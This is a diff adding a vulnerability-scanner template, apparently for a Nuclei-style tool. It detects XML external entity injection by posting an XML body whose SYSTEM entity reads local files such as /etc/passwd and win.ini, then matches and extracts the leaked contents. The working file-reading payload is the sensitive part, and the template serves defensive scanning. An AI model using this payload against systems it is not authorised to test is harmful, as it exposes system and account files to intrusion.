@@ -1,0 +1,61 @@
+# XML External Entity Injection Detection Module
+id: xxe-error-based
+info:
+  name: XML External Entity Injection
+  author: sif
+  severity: high
+  description: Detects XML external entity injection by confirming the parser expanded a SYSTEM entity and returned the contents of a local file the payload never contained
+  tags: [xxe, injection, xml, owasp-top10]
+
+type: http
+
+http:
+  method: POST
+  paths:
+    - "{{BaseURL}}/"
+    - "{{BaseURL}}/api"
+    - "{{BaseURL}}/api/xml"
+    - "{{BaseURL}}/xml"
+    - "{{BaseURL}}/soap"
+    - "{{BaseURL}}/upload"
+    - "{{BaseURL}}/import"
+    - "{{BaseURL}}/xmlrpc.php"
+
+  headers:
+    Content-Type: application/xml
+    Accept: application/xml
+
+  # the payload is only ever a file *path*; a match requires the target
+  # file's actual contents, so a benign echo of the payload text (the path
+  # string itself) can never satisfy the matcher.
+  payloads:
+    - "/etc/passwd"
+    - "/etc/hosts"
+    - "/windows/win.ini"
+
+  body: |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{{payload}}"> ]>
+    <foo>&xxe;</foo>
+
+  threads: 10
+
+  matchers:
+    - type: regex
+      part: body
+      regex:
+        - "root:.*:0:0:"
+        - "daemon:.*:1:1:"
+        - "nobody:.*:65534:"
+        - "127\\.0\\.0\\.1\\s+localhost"
+        - "\\[fonts\\]"
+        - "; for 16-bit app support"
+      condition: or
+
+  extractors:
+    - type: regex
+      name: leaked_content
+      part: body
+      regex:
+        - "(root|daemon|nobody):.*:[0-9]+:[0-9]+:"
+      group: 0
